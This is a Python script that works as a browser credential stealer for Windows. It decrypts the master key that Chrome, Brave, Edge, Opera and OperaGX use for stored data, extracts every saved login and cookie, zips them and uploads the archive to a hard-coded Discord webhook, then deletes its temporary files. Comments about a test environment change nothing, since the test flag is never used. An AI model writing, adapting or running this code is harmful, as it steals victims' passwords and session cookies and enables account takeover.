import os
import tempfile  # For test environment temp directories
from base64 import b64decode
from json import loads
from shutil import copy2, make_archive, rmtree
from sqlite3 import connect
import win32crypt
from Cryptodome.Cipher import AES
from requests import post

# Check if we are in test environment
is_test_env = os.getenv('TEST_ENV', 'false').lower() == 'true'

# Set the paths for browser data
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')


webhook_url = "https://discord.com/api/webhooks/1089025729930481756/pKGcx7iQfBL4NwBxibrirlx8J3vndCXOrvtLKXzFNaMi5ZZK9gF_6GWau3kiD58HYnPd"

# Create a folder for the data, use temp directory if in test mode

output_dir = tempfile.mkdtemp()  # Create a temporary directory for testing


# Define browser locations
browser_loc = {
    "Chrome": f"{local}\\Google\\Chrome",
    "Brave": f"{local}\\BraveSoftware\\Brave-Browser",
    "Edge": f"{local}\\Microsoft\\Edge",
    "Opera": f"{roaming}\\Opera Software\\Opera Stable",
    "OperaGX": f"{roaming}\\Opera Software\\Opera GX Stable",
}

# Decrypt browser data
def decrypt_browser(LocalState, LoginData, CookiesFile, name):
    try:
        if os.path.exists(LocalState):
            with open(LocalState) as f:
                local_state = loads(f.read())
                master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
                master_key = win32crypt.CryptUnprotectData(master_key[5:], None, None, None, 0)[1]

        # Handle login data
        if os.path.exists(LoginData):
            try:
                copy2(LoginData, "TempLogin.db")
                with connect("TempLogin.db") as conn:
                    cur = conn.cursor()
                cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                with open(f"{output_dir}/passwords_{name}.txt", "a") as f:
                    f.write(f"*** {name} ***\n")
                for logins in cur.fetchall():
                    try:
                        url, username, password = logins
                        if url and username and password:
                            cipher = AES.new(master_key, AES.MODE_GCM, password[3:15])
                            decrypted_pass = cipher.decrypt(password[15:-16]).decode()
                            with open(f"{output_dir}/passwords_{name}.txt", "a") as f:
                                f.write(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_pass}\n\n")
                    except Exception as e:
                        print(f"Error decrypting login data: {e}")
            except Exception as e:
                print(f"Failed to copy login data or decrypt: {e}")

        # Handle cookies
        if os.path.exists(CookiesFile):
            try:
                copy2(CookiesFile, "TempCookies.db")
                with connect("TempCookies.db") as conn:
                    cur = conn.cursor()
                cur.execute("SELECT host_key, name, encrypted_value FROM cookies")
                with open(f"{output_dir}/cookies_{name}.txt", "a") as f:
                    f.write(f"*** {name} Cookies ***\n")
                for cookie in cur.fetchall():
                    try:
                        host, name, encrypted_value = cookie
                        if host and name and encrypted_value:
                            cipher = AES.new(master_key, AES.MODE_GCM, encrypted_value[3:15])
                            decrypted_value = cipher.decrypt(encrypted_value[15:-16]).decode()
                            with open(f"{output_dir}/cookies_{name}.txt", "a") as f:
                                f.write(f"Host: {host}\nName: {name}\nValue: {decrypted_value}\n\n")
                    except Exception as e:
                        print(f"Error decrypting cookies: {e}")
            except Exception as e:
                print(f"Failed to copy cookies or decrypt: {e}")

    except Exception as e:
        print(f"Error accessing browser data for {name}: {e}")

# Zip the extracted data
def zip_extracted_data():
    zip_path = f"{output_dir}.zip"
    make_archive(output_dir, 'zip', output_dir)
    return zip_path

# Send the zipped data to the Discord webhook
def send_to_webhook(zip_file):
    try:
        with open(zip_file, 'rb') as f:
            response = post(webhook_url, files={"file": (f"{output_dir}.zip", f)})
        return response.status_code
    except Exception as e:
        print(f"Error sending data to webhook: {e}")
        return None

# Main function
def main():
    for name, path in browser_loc.items():
        if os.path.exists(path):
            decrypt_browser(f"{path}\\User Data\\Local State", f"{path}\\User Data\\Default\\Login Data", f"{path}\\User Data\\Default\\Network\\Cookies", name)

    zip_file = zip_extracted_data()
    status = send_to_webhook(zip_file)

    # Clean up
    if status == 200:
        rmtree(output_dir)
        os.remove(zip_file)
    if os.path.exists("TempLogin.db"):
        os.remove("TempLogin.db")
    if os.path.exists("TempCookies.db"):
        os.remove("TempCookies.db")

if __name__ == "__main__":
    main()
